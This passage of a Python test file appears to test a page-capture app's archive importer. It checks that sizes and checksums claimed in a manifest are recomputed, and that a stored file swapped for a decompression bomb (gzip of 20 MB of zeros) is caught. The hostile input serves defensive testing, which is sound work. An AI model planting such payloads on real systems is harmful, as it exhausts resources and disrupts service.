    """Sizes and checksums in a manifest are claims. What is stored is what was counted."""
    keep_everything()
    text = b"<p>what it really says</p>"
    archive = archive_with(
        user,
        {
            "source_file": "media/captures/1/s.txt.gz",
            "source_size": 1,
            "source_checksum": "0" * 64,
            "rendering_file": "media/captures/1/r.png",
            "rendering_type": "image/png",
            "rendering_size": 1,
            "rendering_checksum": "0" * 64,
            "rendered_by": "somebody-else",
        },
        {"media/captures/1/s.txt.gz": gzip.compress(text), "media/captures/1/r.png": PNG},
    )

    importer.load(other_user, archive)

    page = CapturedPage.objects.for_user(other_user).get()
    assert page.source_size == len(text) and page.rendering_size == len(PNG)
    assert page.source_checksum != "0" * 64 and page.rendering_checksum != "0" * 64
    assert page.rendered_by == "", "one of two, or nothing"
    assert pages.read_source(page) == text.decode()


def test_a_kept_file_swapped_on_the_disk_cannot_unpack_without_end(client, kept, settings):
    """What is on the disk is not always what Postulo wrote there."""
    settings.POSTULO_CAPTURE_SOURCE_MAX_BYTES = 10_000
    (Path(settings.MEDIA_ROOT) / kept.page.source.name).write_bytes(
        gzip.compress(b"\x00" * 20_000_000)
    )
    client.force_login(kept.owner)

    page = client.get(reverse("jobs:capture_page", args=[kept.pk]))
    download = client.get(reverse("jobs:capture_page_source", args=[kept.pk]))

    assert page.status_code == 200 and "data-source-unreadable" in page.content.decode()
    assert download.status_code == 404
